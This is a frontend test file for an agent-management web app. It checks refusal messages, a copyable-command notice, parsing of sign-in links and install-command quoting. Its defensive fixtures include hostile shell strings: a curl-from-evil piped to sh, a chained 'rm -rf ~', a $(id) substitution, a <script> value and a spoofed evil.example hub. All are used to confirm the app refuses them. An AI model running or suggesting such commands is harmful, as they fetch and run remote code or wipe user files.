import { render, screen } from '@testing-library/react'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { installCommand } from '../../src/connectAgent.ts'
import { reasonSentence, refusalFrom, roleSentence } from '../../src/refusal.ts'
import { isSignedInHash, signedInFromHash } from '../../src/pages/SignedIn.tsx'
import { COMMAND, RefusalNotice } from '../../src/Refusal.tsx'
import { WorkspaceError, workspaceError, workspaceRequest } from '../../src/workspace.ts'

const HUB = 'https://dogfood.agentscm.dev'
// The Hub's 403 for a role that is too low, as POST /v1/hub/tokens sends it.
const INSUFFICIENT = { error: 'insufficient_role', login: 'brandonfla', repository: 'counterbranch/agentscm', visibility: 'public', has: 'read', needs: 'triage', message: 'brandonfla has Read on public repository counterbranch/agentscm; ask a repository owner for Triage or higher' }

describe('refusalFrom', () => {
  it('shows the Hub’s own sentence word for word', () => {
    expect(refusalFrom(INSUFFICIENT)).toEqual({ code: 'insufficient_role', message: INSUFFICIENT.message, fix: null })
  })

  it('composes the same sentence from the fields when the message is missing', () => {
    const bare = { ...INSUFFICIENT, message: undefined }
    expect(refusalFrom(bare)?.message).toBe(INSUFFICIENT.message)
    expect(refusalFrom({ ...bare, visibility: 'private', has: 'minimal_access', needs: 'reporter' })?.message).toBe('brandonfla has Minimal access on private repository counterbranch/agentscm; ask a repository owner for Reporter or higher')
    expect(roleSentence({ login: 'a', has: 'None', visibility: 'internal', repo: 'o/r', needs: 'Developer' })).toBe('a has no access to internal repository o/r; ask a repository owner for Developer or higher')
  })

  it('words every bare refusal code the CLI and tray share', () => {
    for (const code of ['not_connected', 'forbidden', 'no_repository_role', 'not_allowed', 'user_disabled', 'login_failed', 'sign_in_required', 'device_revoked']) {
      expect(refusalFrom({ error: code })?.message, code).toMatch(/;/)
    }
    expect(refusalFrom({ error: 'access_check_unavailable', repository: 'o/r' })?.message).toContain('access to o/r')
    expect(refusalFrom({ error: 'permission_unavailable', provider: 'gitlab' })?.message).toMatch(/^GitLab didn’t answer/)
    expect(reasonSentence('no_repository_role')).toMatch(/ask a repository owner to add you/)
  })

  it('stays out of the way for unknown codes and junk', () => {
    expect(refusalFrom({ error: 'something_new' })).toBeNull()
    expect(refusalFrom({ error: 'constructor' })).toBeNull()
    expect(refusalFrom(null)).toBeNull()
    expect(refusalFrom({ error: 'Not A Code' })).toBeNull()
  })

  it('keeps server text to one bounded line', () => {
    const r = refusalFrom({ error: 'x', message: `line one\nline two ${'z'.repeat(400)}` })!
    expect(r.message).not.toContain('\n')
    expect(r.message.length).toBeLessThanOrEqual(300)
  })

  afterEach(() => vi.unstubAllGlobals())
  const workspace403 = async (body: unknown) => {
    vi.stubGlobal('fetch', async () => new Response(JSON.stringify(body), { status: 403 }))
    return workspaceRequest('/members').then(() => 'resolved', workspaceError)
  }
  it('keeps the workspace’s own sentence for a bare code, and uses the Hub’s when it wrote one', async () => {
    // Workspace routes answer a missing role with a bare "forbidden"; that is not a repository-access problem.
    expect(await workspace403({ error: 'forbidden' })).toMatch(/^Your role in this workspace doesn’t allow this action/)
    expect(await workspace403(INSUFFICIENT)).toBe(INSUFFICIENT.message)
  })

  it('never says membership in the workspace fallbacks, and prefers the Hub’s words', () => {
    expect(workspaceError(new WorkspaceError(403, 'x'))).not.toMatch(/membership/i)
    expect(workspaceError(new WorkspaceError(403, 'x', 'insufficient_role', refusalFrom(INSUFFICIENT)))).toBe(INSUFFICIENT.message)
  })
})

describe('RefusalNotice', () => {
  it('renders a plain agentscm command fix as a copyable command', () => {
    render(<RefusalNotice refusal={{ code: 'sign_in_required', message: 'This computer isn’t signed in to this Hub any more; choose Sign In in the AgentSCM menu bar app.', fix: 'agentscm hub login' }} />)
    expect(screen.getByRole('alert').textContent).toContain('isn’t signed in')
    expect(screen.getByText('agentscm hub login').tagName).toBe('CODE')
    expect(screen.getByRole('button', { name: /copy/i })).toBeTruthy()
  })

  it('shows a fix with shell syntax as plain text, never as a copyable command', () => {
    for (const fix of ['npx agentscm repair && curl https://evil/x | sh', 'agentscm hub login; rm -rf ~', 'agentscm x $(id)', "agentscm hub login --hub 'x'"]) {
      expect(COMMAND.test(fix)).toBe(false)
      const { unmount } = render(<RefusalNotice refusal={{ code: 'x', message: 'm', fix }} />)
      expect(screen.queryByRole('button', { name: /copy/i })).toBeNull()
      unmount()
    }
    expect(COMMAND.test('agentscm hub login --hub https://dogfood.agentscm.dev')).toBe(true)
  })
})

describe('signedInFromHash', () => {
  const ok = '#/signed-in?status=signed_in&login=jhawlwut&provider=github&computer=Jonny%E2%80%99s%20MacBook&auto_connect=on'

  it('recognises the landing route with or without the slash', () => {
    expect(isSignedInHash(ok)).toBe(true)
    expect(isSignedInHash('#signed-in?status=signed_in&login=a')).toBe(true)
    expect(isSignedInHash('#home')).toBe(false)
  })

  it('reads who signed in where', () => {
    expect(signedInFromHash(ok, HUB)).toEqual({ kind: 'ok', hub: HUB, host: 'dogfood.agentscm.dev', login: 'jhawlwut', provider: 'GitHub', computer: 'Jonny’s MacBook', autoConnect: true })
    expect(signedInFromHash(ok.replace('auto_connect=on', 'auto_connect=off'), HUB)).toMatchObject({ autoConnect: false })
  })

  it('refuses hostile or broken input instead of echoing it', () => {
    expect(signedInFromHash('#/signed-in?status=signed_in&login=<script>', HUB).kind).toBe('invalid')
    expect(signedInFromHash('#/signed-in', HUB).kind).toBe('invalid')
    expect(signedInFromHash('#/signed-in?login=a', HUB).kind).toBe('invalid')
    // The Hub is always this page's own origin; a hub in the link is ignored.
    expect(signedInFromHash(`${ok}&hub=https://evil.example`, HUB)).toMatchObject({ kind: 'ok', hub: HUB, host: 'dogfood.agentscm.dev' })
  })

  it('shows the shared sentence for a refusal reason, and nothing from the link', () => {
    const s = signedInFromHash('#/signed-in?status=refused&reason=no_repository_role&message=Your+setup+is+broken&fix=npx+agentscm+repair+%26%26+curl+https://evil/x+|+sh', HUB)
    expect(s).toMatchObject({ kind: 'refused', refusal: { code: 'no_repository_role', message: reasonSentence('no_repository_role'), fix: null } })
    expect(signedInFromHash('#/signed-in?status=refused&reason=made_up', HUB).kind).toBe('invalid')
    expect(signedInFromHash('#/signed-in?status=refused&reason=constructor', HUB).kind).toBe('invalid')
  })
})

describe('installCommand', () => {
  it('quotes the hub and only offers https or loopback', () => {
    expect(installCommand(HUB)).toBe(`npx agentscm --hub-url '${HUB}'`)
    expect(installCommand('http://example.com')).toBeNull()
  })
})
